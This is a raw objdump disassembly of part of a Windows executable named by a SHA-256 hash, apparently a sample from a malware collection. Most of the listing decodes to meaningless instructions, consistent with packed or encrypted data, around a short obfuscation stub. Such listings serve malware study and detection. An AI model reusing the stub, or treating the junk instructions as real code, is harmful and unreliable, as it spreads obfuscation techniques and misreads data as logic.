
b0dabcc82274091c9c6f21aabb9e20e80ebe5a1b2526a435a689d888cba8aa7e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0x366d7c08,cl
  401025:	(bad)  
  401026:	jle    0x4010a6
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    al,ch
  40103c:	add    BYTE PTR [edi],cl
  40103e:	xor    ecx,DWORD PTR [edi]
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xf18cb5a5
  4010d8:	fisubr WORD PTR [edx+0x8f8af10]
  4010de:	aam    0x25
  4010e0:	(bad)  
  4010e1:	jl     0x401154
  4010e3:	out    0xec,al
  4010e5:	adc    DWORD PTR [edi+0x3f181e7e],edx
  4010eb:	and    al,0xff
  4010ed:	jno    0x4010de
  4010ef:	mov    ebp,0xcad46efa
  4010f4:	je     0x40114e
  4010f6:	hlt    
  4010f7:	out    dx,al
  4010f8:	cmp    al,0xff
  4010fa:	and    al,0x93
  4010fc:	in     eax,dx
  4010fd:	pop    es
  4010fe:	nop
  4010ff:	outs   dx,DWORD PTR ds:[esi]
  401100:	and    DWORD PTR [ecx+0x6d],0x1437a68
  401107:	xchg   ebx,eax
  401108:	das    
  401109:	sub    ebx,DWORD PTR [eax]
  40110b:	dec    esi
  40110c:	mov    fs,ebp
  40110e:	std    
  40110f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401110:	push   0xebe21dce
  401115:	(bad)  
  401116:	in     al,dx
  401117:	cmp    ah,BYTE PTR [esi]
  401119:	xchg   esp,eax
  40111a:	add    al,0xd2
  40111c:	stos   DWORD PTR es:[edi],eax
  40111d:	ins    BYTE PTR es:[edi],dx
  40111e:	xor    al,0xc7
  401120:	push   ds
  401121:	shr    DWORD PTR [esi+0x56b7c1ec],cl
  401127:	(bad)  
  401128:	ficomp DWORD PTR [ebp+0x58]
  40112b:	icebp  
  40112c:	cmp    bh,cl
  40112e:	(bad)  
  40112f:	sub    eax,0xfe62a9d0
  401134:	int3   
  401135:	addr16 mov ecx,0xf8fc4723
  40113b:	cmc    
  40113c:	shl    BYTE PTR ds:0xa87238a8,0x74
  401143:	sub    DWORD PTR [eax-0x15],ecx
  401146:	push   ebp
  401147:	sbb    al,0xe0
  401149:	je     0x401127
  40114b:	cwde   
  40114c:	aas    
  40114d:	or     eax,0xe019676f
  401152:	adc    DWORD PTR [eax+0x4104e0ee],edi
  401158:	das    
  401159:	sub    eax,0xa110826f
  40115e:	lahf   
  40115f:	data16 lods al,BYTE PTR ds:[esi]
  401161:	adc    BYTE PTR [ebx+0x2],0xad
  401165:	xchg   ecx,eax
  401166:	add    edx,DWORD PTR ds:[eax+0x27403747]
  40116d:	jne    0x4011dd
  40116f:	ret    
  401170:	iret   
  401171:	push   eax
  401172:	adc    eax,0xc3acca25
  401177:	cwde   
  401178:	cli    
  401179:	loopne 0x401185
  40117b:	hlt    
  40117c:	repz mov dl,0xe
  40117f:	aam    0x16
  401181:	inc    esp
  401182:	imul   al
  401184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401185:	xchg   BYTE PTR [eax],bh
  401187:	pop    edx
  401188:	leave  
  401189:	enter  0x75c5,0x1
  40118d:	mov    WORD PTR [ecx+0x516205ff],?
  401193:	dec    ebp
  401194:	cmp    cl,BYTE PTR [ecx+0x44]
  401197:	out    dx,al
  401198:	sub    bh,BYTE PTR [ebp-0x6c6ee6b1]
  40119e:	aam    0x9
  4011a0:	popf   
  4011a1:	les    ebp,FWORD PTR [ebp-0x21008c1c]
  4011a7:	jmp    0x4011dd
  4011a9:	xor    al,0x2c
  4011ab:	cwde   
  4011ac:	outs   dx,BYTE PTR ds:[esi]
  4011ad:	xchg   DWORD PTR [ebx+0x28],edx
  4011b0:	sbb    ah,bl
  4011b2:	xchg   DWORD PTR [eax],eax
  4011b4:	fdivr  QWORD PTR [ebx+edi*8+0xc]
  4011b8:	popf   
  4011b9:	out    dx,eax
  4011ba:	mov    eax,0xae8e0f2f
  4011bf:	imul   ebp,ecx,0x3
  4011c2:	jae    0x401182
  4011c4:	dec    ebp
  4011c5:	sub    al,0xe7
  4011c7:	iret   
  4011c8:	and    DWORD PTR [ecx-0x12],edx
  4011cb:	fist   WORD PTR [esi-0x72]
  4011ce:	jle    0x4011a5
  4011d0:	out    dx,al
  4011d1:	push   0x1e
  4011d3:	xor    DWORD PTR [edi-0x17],esi
  4011d6:	pop    ebx
  4011d7:	adc    eax,0x66710835
  4011dc:	mov    bl,0x90
  4011de:	jmp    0xd4b64270
  4011e3:	mov    dl,0x1b
  4011e5:	mul    WORD PTR [ebx]
  4011e8:	inc    eax
  4011e9:	ror    BYTE PTR [ebx-0x31],cl
  4011ec:	push   cs
  4011ed:	fsubr  QWORD PTR [edi+0x3df48952]
  4011f3:	xor    BYTE PTR [edx+0x69ebd298],ch
  4011f9:	inc    esp
  4011fa:	mov    eax,0x748cf2b0
  4011ff:	push   edx
  401200:	mov    eax,0xf1f7baff
  401205:	pop    ebx
  401206:	fstp   TBYTE PTR [ebx-0x6f]
  401209:	mov    eax,ds:0xc51a3289
  40120e:	inc    esp
  40120f:	cmc    
  401210:	and    cl,bh
  401212:	sar    DWORD PTR [esi+0x25],1
  401215:	int    0xb8
  401217:	pop    ebp
  401218:	sbb    BYTE PTR [ebx+0x46edd9ac],dl
  40121e:	jle    0x4011e3
  401220:	mov    edx,0x5405d38e
  401225:	add    edx,edx
  401227:	adc    eax,0xa13bf28f
  40122c:	bound  esp,QWORD PTR [esi]
  40122e:	das    
  40122f:	pushf  
  401230:	sub    al,0x96
  401232:	xchg   edi,eax
  401233:	nop
  401234:	jo     0x401245
  401236:	lock mov dh,0x2d
  401239:	je     0x4012af
  40123b:	push   ds
  40123c:	xchg   ebx,ebp
  40123e:	pop    ebp
  40123f:	das    
  401240:	xchg   ecx,eax
  401241:	les    edi,FWORD PTR [edx]
  401243:	sti    
  401244:	scas   al,BYTE PTR es:[edi]
  401245:	xchg   ebx,eax
  401246:	sbb    eax,0x6441f4c7
  40124b:	jmp    0x4011fb
  40124d:	sub    eax,0x6d543c84
  401252:	jp     0x40128f
  401254:	out    dx,eax
  401255:	or     BYTE PTR [edi],al
  401257:	pop    eax
  401258:	int    0xde
  40125a:	ror    ebx,1
  40125c:	fmul   DWORD PTR [ecx+eax*1+0x75b72c4e]
  401263:	test   al,0x3a
  401265:	mov    DWORD PTR [eax+0x6bf2aa8c],esi
  40126b:	(bad)  
  40126c:	out    dx,eax
  40126d:	jmp    0xd19c23eb
  401272:	rcl    DWORD PTR [edi],1
  401274:	pop    ebp
  401275:	jecxz  0x40124e
  401277:	(bad)  
  401279:	xchg   esp,eax
  40127a:	and    BYTE PTR [esi],cl
  40127c:	jp     0x401257
  40127e:	jno    0x401286
  401280:	lock test bh,bh
  401283:	adc    eax,0x95eb417c
  401288:	adc    bl,dl
  40128a:	les    esi,FWORD PTR [esi+0x16ac8eb0]
  401290:	or     dl,BYTE PTR [esi+0x22d779d8]
  401296:	call   0x2897:0x4a0355c6
  40129d:	call   0xcf7c:0x72a8b3f1
  4012a4:	imul   ecx,ebx,0xf27e742b
  4012aa:	xor    esi,edi
  4012ac:	into   
  4012ad:	or     BYTE PTR [ebp+0x30],ah
  4012b0:	stos   BYTE PTR es:[edi],al
  4012b1:	jae    0x40126d
  4012b3:	cld    
  4012b4:	mov    ds,WORD PTR [esi+ebp*2+0x6f]
  4012b8:	sbb    DWORD PTR [eax],ecx
  4012ba:	jmp    0x849ced02
  4012bf:	add    BYTE PTR [eax-0x6a],0x3f
  4012c3:	sub    al,0x24
  4012c5:	repz cmp bp,WORD PTR [ebx+0x7687f1b7]
  4012cd:	add    esi,DWORD PTR [eax-0x7258cb12]
  4012d3:	stos   BYTE PTR es:[edi],al
  4012d4:	jmp    0xd3a1:0x5909cbec
  4012db:	jp     0x4012a2
  4012dd:	inc    BYTE PTR [edx]
  4012df:	pop    ebx
  4012e0:	push   edx
  4012e1:	pop    esp
  4012e2:	cs cmp esi,ebp
  4012e5:	push   esi
  4012e6:	sbb    DWORD PTR [esi+0x150156d9],edx
  4012ec:	add    al,0x85
  4012ee:	retf   
  4012ef:	cwde   
  4012f0:	in     al,0x42
  4012f2:	mov    ds:0x4f36b4e7,al
  4012f7:	mov    ch,0x25
  4012f9:	in     eax,dx
  4012fa:	sbb    eax,0xbbc445a5
  4012ff:	nop
  401300:	xchg   edi,eax
  401301:	and    dh,al
  401303:	dec    esp
  401304:	push   0xcae757ce
  401309:	mov    ds:0x497e6d0f,al
  40130e:	scas   eax,DWORD PTR es:[edi]
  40130f:	test   BYTE PTR [ebx+0x317efb10],al
  401315:	test   bl,cl
  401317:	outs   dx,DWORD PTR ds:[esi]
  401318:	add    dl,BYTE PTR [edx]
  40131a:	cmp    al,0x7f
  40131c:	or     al,BYTE PTR [eax+0x27b59c0e]
  401322:	mov    bl,0xf7
  401324:	adc    dl,BYTE PTR [ecx+esi*8+0x45]
  401328:	dec    esp
  401329:	pushf  
  40132a:	and    ch,BYTE PTR [esi]
  40132c:	pop    ebx
  40132d:	pop    edx
  40132e:	fld    DWORD PTR [eax]
  401330:	mov    ebx,0xaaeeaa8a
  401335:	sub    DWORD PTR [eax],ecx
  401337:	fistp  DWORD PTR [ecx+ebp*8-0x36]
  40133b:	adc    DWORD PTR [edx+0x5ae27e13],ebx
  401341:	in     eax,dx
  401342:	scas   al,BYTE PTR es:[edi]
  401343:	inc    ebp
  401344:	retf   
  401345:	inc    ebx
  401346:	jmp    0x401359
  401348:	fimul  WORD PTR [ecx+0x6e]
  40134b:	aas    
  40134c:	xchg   DWORD PTR [eax-0x1c95c200],ecx
  401352:	ins    DWORD PTR es:[edi],dx
  401353:	test   eax,0xe47a22f
  401358:	pop    edi
  401359:	(bad)  
  40135a:	pop    edi
  40135b:	mov    cl,0xd9
  40135d:	out    0x6a,al
  40135f:	push   ss
  401360:	ss xchg edi,eax
  401362:	clc    
  401363:	cli    
  401364:	(bad)  
  401365:	loopne 0x401385
  401367:	lea    esi,[ebp-0x3855be95]
  40136d:	xchg   cl,bh
  40136f:	daa    
  401370:	daa    
  401371:	pop    ecx
  401372:	adc    ebp,ebx
  401374:	adc    dl,0x14
  401377:	shr    DWORD PTR [edx],0x28
  40137a:	arpl   dx,ax
  40137c:	inc    ebp
  40137d:	cmc    
  40137e:	or     dh,BYTE PTR [edx-0x2e2fd289]
  401384:	fcmovu st,st(6)
  401386:	shl    DWORD PTR [esi-0x5c],cl
  401389:	dec    edx
  40138a:	push   esp
  40138b:	dec    edx
  40138c:	jmp    0x262c08c8
  401391:	in     al,0x57
  401393:	adc    al,BYTE PTR [ebp+0x42]
  401396:	cmp    BYTE PTR [eax+0x349e9734],cl
  40139c:	adc    ebp,ebp
  40139e:	mov    eax,ds:0x249c2efd
  4013a3:	out    0x20,al
  4013a5:	retf   
  4013a6:	mov    ah,0xa4
  4013a8:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4013aa:	rcl    DWORD PTR [ecx],0xc6
  4013ad:	cmp    ch,BYTE PTR [edi+0xd]
  4013b0:	rcl    BYTE PTR [ebx+0x2445bd60],0xb3
  4013b7:	aam    0x60
  4013b9:	mov    cl,0x5c
  4013bb:	xor    al,0xb6
  4013bd:	lock adc DWORD PTR [ebx],edx
  4013c0:	cmp    bl,BYTE PTR [ebx]
  4013c2:	ds icebp 
  4013c4:	popf   
  4013c5:	ins    DWORD PTR es:[edi],dx
  4013c6:	jo     0x4013fb
  4013c8:	arpl   WORD PTR [eax-0x1b24e4e0],ax
  4013ce:	jo     0x4013d3
  4013d0:	jmp    DWORD PTR [eax-0x66]
  4013d3:	sti    
  4013d4:	adc    DWORD PTR [edx+ebp*4],eax
  4013d7:	jmp    0x7a7bfb43
  4013dc:	mov    ecx,cs
  4013de:	jle    0x40136a
  4013e0:	das    
  4013e1:	push   ds
  4013e2:	push   ebp
  4013e3:	aas    
  4013e4:	sti    
  4013e5:	adc    esi,edi
  4013e7:	ret    
  4013e8:	and    DWORD PTR [ebp-0x165b4ee8],ebp
  4013ee:	and    BYTE PTR ds:[esi],cl
  4013f1:	outs   dx,DWORD PTR ds:[esi]
  4013f2:	int3   
  4013f3:	aam    0xf3
  4013f5:	ror    DWORD PTR [ebx+0x6],1
  4013f8:	jmp    0x401420
  4013fa:	jo     0x40145f
  4013fc:	arpl   bp,si
  4013fe:	xlat   BYTE PTR ds:[ebx]
  4013ff:	pop    es
  401400:	(bad)  
  401402:	hlt    
  401403:	pusha  
  401404:	imul   BYTE PTR [ebp-0x6f]
  401407:	loopne 0x401483
  401409:	dec    ebx
  40140a:	xor    BYTE PTR [edi-0x2f],ah
  40140d:	xchg   ebp,eax
  40140e:	push   esi
  40140f:	xchg   esi,eax
  401410:	sub    BYTE PTR [ebx+0x285512b],bh
  401416:	in     eax,dx
  401417:	xchg   ecx,eax
  401418:	inc    edi
  401419:	pusha  
  40141a:	cmp    eax,0x96be0231
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    edx,ebx
  4014c2:	repz hlt 
  4014c4:	cmp    al,0x6f
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014be
  4014ce:	push   cs
  4014cf:	or     al,0x16
  4014d1:	(bad)  
  4014d2:	(bad)  
  4014d3:	pop    esp
  4014d4:	jno    0x4014a3
  4014d6:	inc    ebx
  4014d7:	mov    bh,0xd7
  4014d9:	mov    ds:0x54c695f1,eax
  4014de:	out    0x3d,al
  4014e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014e1:	sbb    BYTE PTR [edi],al
  4014e3:	lds    ebp,FWORD PTR [esi]
  4014e5:	pusha  
  4014e6:	and    ebp,DWORD PTR [ebp-0x3]
  4014e9:	jns    0x401554
  4014eb:	and    edx,DWORD PTR [edi+0x60afb4c2]
  4014f1:	aas    
  4014f2:	sub    DWORD PTR [edx],0xffffffd6
  4014f5:	fwait
  4014f6:	add    DWORD PTR es:[ebx+0x5c],0x802dcfa9
  4014fe:	cld    
  4014ff:	sbb    ebp,esp
  401501:	xor    eax,0x4cfcd1b
  401506:	inc    edx
  401507:	sub    eax,0x3c370672
  40150c:	jmp    0x40156d
  40150e:	inc    edx
  40150f:	loop   0x40152a
  401511:	cmp    al,0xbf
  401513:	cwde   
  401514:	mov    edx,0x3bcf11e3
  401519:	mov    ebx,0x24aacc32
  40151e:	cmp    DWORD PTR [eax],0x5d
  401521:	mov    ds:0xb455b31b,eax
  401526:	inc    edx
  401527:	adc    ebp,DWORD PTR [ecx-0xff0b107]
  40152d:	sub    cl,dh
  40152f:	inc    ebp
  401530:	inc    edi
  401531:	clc    
  401532:	popa   
  401533:	push   esp
  401534:	and    al,0x74
  401536:	xchg   BYTE PTR [edi],ch
  401538:	push   esp
  401539:	pop    edi
  40153a:	loope  0x401586
  40153c:	daa    
  40153d:	xor    DWORD PTR [esi+0x46c61ccf],ebx
  401543:	std    
  401544:	iret   
  401545:	int    0xc1
  401547:	adc    al,0x79
  401549:	xchg   BYTE PTR [edi-0x64],dh
  40154c:	sub    eax,0xd5681c2f
  401551:	add    al,0x9a
  401553:	imul   ebp,DWORD PTR [ecx+0x21748040],0xbc48908e
  40155d:	bound  esi,QWORD PTR [edi-0x7b]
  401560:	cmp    DWORD PTR [esi-0x4b],edx
  401563:	adc    ah,BYTE PTR [edi+0x33]
  401566:	and    DWORD PTR [esi+eax*1+0x43],esi
  40156a:	and    eax,0x8405998e
  40156f:	mov    WORD PTR [di+0x3],ds
  401573:	push   edx
  401574:	adc    al,dh
  401576:	div    BYTE PTR [edx]
  401578:	ds mov cl,0xef
  40157b:	int    0x72
  40157d:	mov    eax,0x4a2d458
  401582:	mov    al,ds:0x74de832f
  401587:	call   0x55986b07
  40158c:	add    esp,ebp
  40158e:	adc    al,BYTE PTR [ebx+0x32adfd68]
  401594:	std    
  401595:	lock dec edx
  401597:	push   0x28f94db5
  40159c:	jo     0x4015ce
  40159e:	xchg   ebx,eax
  40159f:	add    eax,DWORD PTR [edx+ecx*4+0x5d]
  4015a3:	xor    BYTE PTR [edx-0xd],ch
  4015a6:	fadd   DWORD PTR [ebp-0x7e1aa905]
  4015ac:	fdivr  QWORD PTR ds:0x7dc7b2ee
  4015b2:	pop    ss
  4015b3:	cld    
  4015b4:	mov    ecx,0x8e3054c4
  4015b9:	sub    DWORD PTR [ebx],esp
  4015bb:	ss sub esp,eax
  4015be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015bf:	pop    ebx
  4015c0:	stc    
  4015c1:	xchg   esi,eax
  4015c2:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  4015c6:	loope  0x4015cd
  4015c8:	or     eax,0x10299554
  4015cd:	dec    edi
  4015ce:	test   dh,ch
  4015d0:	cmc    
  4015d1:	lahf   
  4015d2:	add    al,0x55
  4015d4:	test   al,0xf8
  4015d6:	add    ebx,DWORD PTR [ecx-0x6003d8f8]
  4015dc:	mov    edx,0x796b8d0f
  4015e1:	leave  
  4015e2:	inc    esp
  4015e3:	sub    DWORD PTR [ebp-0x4d408dd9],ebx
  4015e9:	and    DWORD PTR [edx],ecx
  4015eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015ec:	and    eax,0xa81d9b56
  4015f1:	mov    al,ds:0xec7448ff
  4015f6:	shl    eax,0x2b
  4015f9:	or     cl,dl
  4015fb:	add    al,0xd5
  4015fd:	jbe    0x401607
  4015ff:	les    esp,FWORD PTR [ebx-0xe]
  401602:	inc    eax
  401603:	in     al,dx
  401604:	aas    
  401605:	enter  0x16a4,0x74
  401609:	test   al,0x2f
  40160b:	push   edi
  40160c:	ins    DWORD PTR es:[edi],dx
  40160d:	adc    ebx,DWORD PTR [esi+0x38]
  401610:	mov    ch,bl
  401612:	je     0x40162c
  401614:	(bad)  
  401615:	js     0x4015f0
  401617:	ror    bl,0x5a
  40161a:	jmp    0x4710c680
  40161f:	(bad)  
  401620:	call   0x1c68e777
  401625:	stos   BYTE PTR es:[edi],al
  401626:	bound  ebp,QWORD PTR [edi-0x79]
  401629:	dec    edx
  40162a:	stos   DWORD PTR es:[edi],eax
  40162b:	outs   dx,BYTE PTR ds:[esi]
  40162c:	shl    BYTE PTR [ecx+0x71fcdc02],cl
  401632:	ins    BYTE PTR es:[edi],dx
  401633:	test   eax,0xd97a6cd8
  401638:	sub    dl,cl
  40163a:	and    al,0x9f
  40163c:	pusha  
  40163d:	and    al,0xb9
  40163f:	mov    dl,0xcd
  401641:	mov    ?,WORD PTR [ecx-0xb]
  401644:	cmc    
  401645:	jbe    0x401675
  401647:	stc    
  401648:	dec    ecx
  401649:	adc    eax,0x6bd4c165
  40164e:	jnp    0x401698
  401650:	adc    al,0x2d
  401652:	mov    esi,0x4e5f503
  401657:	cmp    DWORD PTR [edi+0x40],esp
  40165a:	and    eax,0xf958ba47
  40165f:	cmp    al,0x32
  401661:	jmp    0x401673
  401663:	jle    0x4016e1
  401665:	inc    eax
  401666:	sbb    esi,DWORD PTR [ecx+0x429f0cea]
  40166c:	je     0x401644
  40166e:	out    0xc,eax
  401670:	popf   
  401671:	jge    0x401680
  401673:	popf   
  401674:	lahf   
  401675:	sub    BYTE PTR [ecx+0x47],cl
  401678:	clc    
  401679:	xchg   esp,eax
  40167a:	mov    ah,BYTE PTR [ecx]
  40167c:	mov    esp,0x54541dbd
  401681:	(bad)  
  401682:	mov    dh,0x74
  401684:	push   ds
  401685:	test   al,0xf7
  401687:	hlt    
  401688:	out    dx,al
  401689:	sub    eax,0x5376cd03
  40168e:	cmp    DWORD PTR [ecx],edi
  401690:	inc    ecx
  401691:	inc    eax
  401692:	icebp  
  401693:	adc    eax,0xee70ea98
  401698:	sar    BYTE PTR [ebx+eiz*2],cl
  40169b:	int    0xfb
  40169d:	imul   edx,DWORD PTR [edi+ebp*8],0x64148ac4
  4016a4:	mov    bh,0xfa
  4016a6:	xchg   BYTE PTR [ecx],ch
  4016a8:	push   cs
  4016a9:	std    
  4016aa:	xchg   DWORD PTR [ebp+0x5a],esi
  4016ad:	xchg   ebx,eax
  4016ae:	dec    ecx
  4016af:	pop    esp
  4016b0:	popf   
  4016b1:	ja     0x401649
  4016b3:	hlt    
  4016b4:	jmp    0x40170c
  4016b6:	inc    edi
  4016b7:	jnp    0x401698
  4016b9:	loop   0x401669
  4016bb:	mov    ds:0xef53a350,eax
  4016c0:	stos   BYTE PTR es:[edi],al
  4016c1:	fidivr WORD PTR [edi+ecx*8+0x34]
  4016c5:	sbb    esi,DWORD PTR [edx]
  4016c7:	sbb    DWORD PTR [edx-0x3c26582a],0xffffffab
  4016ce:	sar    DWORD PTR [esi],cl
  4016d0:	xor    cl,BYTE PTR [edx-0x3e]
  4016d3:	adc    eax,0x7777a141
  4016d8:	inc    esp
  4016d9:	scas   al,BYTE PTR es:[edi]
  4016da:	int3   
  4016db:	sbb    ecx,DWORD PTR [ecx+eiz*1+0x42]
  4016df:	hlt    
  4016e0:	pop    es
  4016e1:	in     al,dx
  4016e2:	gs sub al,0xd2
  4016e5:	adc    bl,BYTE PTR [ebx]
  4016e7:	cmp    al,0x24
  4016e9:	mov    bh,0xbf
  4016eb:	loopne 0x40172f
  4016ed:	sbb    eax,0x3eb3ab38
  4016f2:	cli    
  4016f3:	adc    eax,0xc4c73075
  4016f8:	adc    bh,BYTE PTR [ecx+ecx*8-0x4f3acb4e]
  4016ff:	enter  0xf868,0xe
  401703:	xchg   ebx,eax
  401704:	push   edi
  401705:	inc    eax
  401706:	mov    edi,0x51ab1137
  40170b:	fldenv [esi-0x42]
  40170e:	or     edi,ebp
  401710:	mov    ds:0x76ef20b8,eax
  401715:	ss sbb eax,0xa2d910d8
  40171b:	(bad)  
  40171c:	sbb    esi,DWORD PTR [esi+eax*8+0x38fd3624]
  401723:	cwde   
  401724:	pop    eax
  401725:	aaa    
  401726:	jmp    0x40173e
  401728:	shl    ebx,1
  40172a:	sub    bh,bh
  40172c:	test   DWORD PTR [ebp+0x1ff345bc],edi
  401732:	cli    
  401733:	stc    
  401734:	and    DWORD PTR [ebx+0x20],ebx
  401737:	xor    ecx,DWORD PTR [edx+0x569597d7]
  40173d:	bound  eax,QWORD PTR [eax-0x55]
  401740:	pop    esi
  401741:	cmp    eax,0x166d0153
  401746:	fld    QWORD PTR [ebp-0x582a116c]
  40174c:	daa    
  40174d:	or     DWORD PTR [esi],edi
  40174f:	aaa    
  401750:	xor    ecx,edx
  401752:	jmp    0xe58cf546
  401757:	stc    
  401758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401759:	jp     0x401702
  40175b:	cmp    bl,bh
  40175d:	and    eax,0x669709bc
  401762:	ss sub eax,0x1d3b6480
  401768:	inc    edi
  401769:	inc    eax
  40176a:	and    ebx,DWORD PTR [esi+eax*4-0x49]
  40176e:	xor    DWORD PTR [bx-0x60b4],ebx
  401773:	repnz retf 
  401775:	or     ecx,DWORD PTR [eax-0x2e4617eb]
  40177b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40177c:	push   0x26869075
  401781:	pop    ebp
  401782:	mov    esp,0x25e1bfcd
  401787:	dec    edi
  401788:	mov    edi,0x72040b5b
  40178d:	clc    
  40178e:	and    al,0xc9
  401790:	imul   edi,DWORD PTR [esi],0x50
  401793:	adc    al,ah
  401795:	cmc    
  401796:	sbb    al,BYTE PTR [edi]
  401798:	push   ecx
  401799:	and    al,0xf2
  40179b:	pop    ecx
  40179c:	je     0x4017b2
  40179e:	ss cs shr esi,1
  4017a2:	dec    edx
  4017a3:	leave  
  4017a4:	xchg   ecx,eax
  4017a5:	push   es
  4017a6:	mov    ah,BYTE PTR ds:0x86d11f5f
  4017ac:	xchg   ebp,eax
  4017ad:	jb     0x4017ba
  4017af:	lock jge 0x401813
  4017b2:	aaa    
  4017b3:	mov    ecx,DWORD PTR [edx-0x7f7044eb]
  4017b9:	xchg   esi,eax
  4017ba:	nop
  4017bb:	test   BYTE PTR [edi],bh
  4017bd:	or     cl,BYTE PTR [esi]
  4017bf:	jle    0x4017c8
  4017c1:	cmc    
  4017c2:	adc    al,0x92
  4017c4:	loopne 0x401776
  4017c6:	adc    BYTE PTR [ecx+esi*4+0x710d76b4],0xd9
  4017ce:	mov    WORD PTR [edi],ds
  4017d0:	dec    ebp
  4017d1:	sbb    BYTE PTR [eax],bl
  4017d3:	push   ds
  4017d4:	mov    bl,0x9c
  4017d6:	cli    
  4017d7:	js     0x401853
  4017d9:	adc    DWORD PTR [ecx-0x7c634ad4],edi
  4017df:	xor    eax,0xea80ecf1
  4017e4:	data16 mov cl,0xb6
  4017e7:	sbb    BYTE PTR [esi-0x56],dh
  4017ea:	cmp    DWORD PTR [edx+0x79],ebx
  4017ed:	and    ch,BYTE PTR [esi-0x1c]
  4017f0:	mov    esi,0xb23272a2
  4017f5:	sub    eax,0xbd0edce1
  4017fa:	dec    esi
  4017fb:	mov    esp,0xf6a96ace
  401800:	test   al,0xea
  401802:	sbb    BYTE PTR [ebx+0x6d],dl
  401805:	daa    
  401806:	push   0x73b1362e
  40180b:	sub    DWORD PTR [ebx+0x996f69b],ecx
  401811:	push   edx
  401812:	add    DWORD PTR [esi+0x43],ecx
  401815:	cld    
  401816:	xchg   DWORD PTR [edi+edx*2-0x6b059580],edx
  40181d:	dec    esp
  40181e:	jo     0x40182f
  401820:	mov    bh,0x29
  401822:	or     ecx,esp
  401824:	ret    0x2abf
